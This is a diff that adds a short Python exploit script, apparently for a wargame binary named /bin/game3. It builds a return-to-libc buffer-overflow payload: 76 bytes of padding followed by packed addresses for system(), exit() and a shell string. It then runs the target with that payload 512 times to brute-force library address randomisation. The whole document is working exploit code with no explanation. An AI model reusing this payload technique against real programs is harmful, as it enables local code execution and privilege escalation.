@@ -1,0 +1,16 @@
+import struct
+from subprocess import call
+
+libc = 0xb75c3000
+system_ = struct.pack("<I", libc + 0x00040310)
+exit_ = struct.pack("<I", libc + 0x00033260)
+shell = struct.pack("<I", libc + 0x00162d4c)
+
+buf = "A" * 76
+buf += system_
+buf += exit_
+buf += shell
+
+for i in range(0,512):
+        print("Testando: "+ str(buf))
+        s = call(["/bin/game3", buf])
